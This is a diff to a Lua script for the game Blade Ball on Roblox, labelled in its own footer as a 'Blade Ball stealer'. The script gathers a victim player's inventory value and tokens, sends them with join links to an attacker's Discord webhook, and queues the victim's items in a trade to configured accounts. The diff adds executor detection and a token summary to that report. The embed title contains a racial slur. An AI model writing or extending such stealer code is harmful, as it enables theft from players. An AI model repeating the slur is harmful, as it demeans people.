@@ -23,6 +23,10 @@ local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
+-- Ajout automatique des variables manquantes pour l'embed
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')"
+
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add usernames or webhook")
     return
@@ -121,12 +125,12 @@ local function formatNumber(number)
     if number == nil then
         return "0"
     end
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 and suffixIndex < #suffixes do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
-	end
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 and suffixIndex < #suffixes do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
     if suffixIndex == 1 then
         return tostring(math.floor(number))
     else
@@ -141,27 +145,9 @@ end
 local totalRAP = 0
 
 local function SendJoinMessage(list, prefix)
-    local fields = {
-        {
-            name = "Victim Username 🤖:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Join link 🔗:",
-            value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
-        },
-        {
-            name = "Item list 📝:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary 💰:",
-            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
-            inline = false
-        }
-    }
+    -- Calcul des tokens pour l'embed
+    local rawText = PlayerGui.Main.Currency.Coins.Amount.Text
+    local tokensForEmbed = rawText:gsub("[^%d]", "") or "0"
 
     local grouped = {}
     for _, item in ipairs(list) do
@@ -186,22 +172,14 @@ local function SendJoinMessage(list, prefix)
         return a.TotalRAP > b.TotalRAP
     end)
 
+    local itemSummary = "🪙 **Tokens: " .. formatNumber(tonumber(tokensForEmbed)) .. "**\n\n"
     for _, group in ipairs(groupedList) do
-        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
-        fields[3].value = fields[3].value .. itemLine .. "\n"
+        itemSummary = itemSummary .. group.Name .. " (x" .. group.Count .. ") - " .. formatNumber(group.TotalRAP) .. " RAP\n"
     end
 
-    if #fields[3].value > 1024 then
-        local lines = {}
-        for line in fields[3].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
+    if #itemSummary > 1000 then itemSummary = string.sub(itemSummary, 1, 1000) .. "\nPlus more!" end
 
-        while #fields[3].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
-    end
+    local browserJoin = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
 
     local data = {
        ["content"] = (ping == "Yes" and "||​|| @everyone" or "") .. "\n`" .. joinCode .. "`",
@@ -224,7 +202,7 @@ local function SendJoinMessage(list, prefix)
                 {
                     ["name"] = "🎯 Inventory:",
                     ["value"] = "```" ..
-                        "\n💰 Total Value: " .. formatNumber(totalRAPVal) .. " RAP" ..
+                        "\n💰 Total Value: " .. formatNumber(totalRAP) .. " RAP" ..
                         "\n\n" .. itemSummary ..
                         "```",
                     ["inline"] = false
@@ -250,22 +228,22 @@ end
 
 local function SendMessage(list)
     local fields = {
-		{
-			name = "Victim Username 🤖:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent 📝:",
-			value = "",
-			inline = false
-		},
+        {
+            name = "Victim Username 🤖:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Items sent 📝:",
+            value = "",
+            inline = false
+        },
         {
             name = "Summary 💰:",
             value = string.format("Total RAP: %s", formatNumber(totalRAP)),
             inline = false
         }
-	}
+    }
 
     local grouped = {}
     for _, item in ipairs(list) do
@@ -311,10 +289,10 @@ local function SendMessage(list)
         ["embeds"] = {{
             ["title"] = "🔵 The nigga is on the server 🎉" ,
             ["color"] = 255,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Blade Ball stealer by Eblack"
-			}
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Blade Ball stealer by Eblack"
+            }
         }}
     }
 
@@ -429,7 +407,7 @@ if #itemsToSend > 0 then
                 addItemToTrade(item.itemType, item.ItemID)
             end
 
-            local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
+            local rawText = PlayerGui.Main.Currency.Coins.Amount.Text
             local trimmedText = rawText:gsub("^%s*(.-)%s*$", "%1")
             local cleanedText = trimmedText:gsub("[^%d]", "")
             local tokensamount = tonumber(cleanedText) or 0
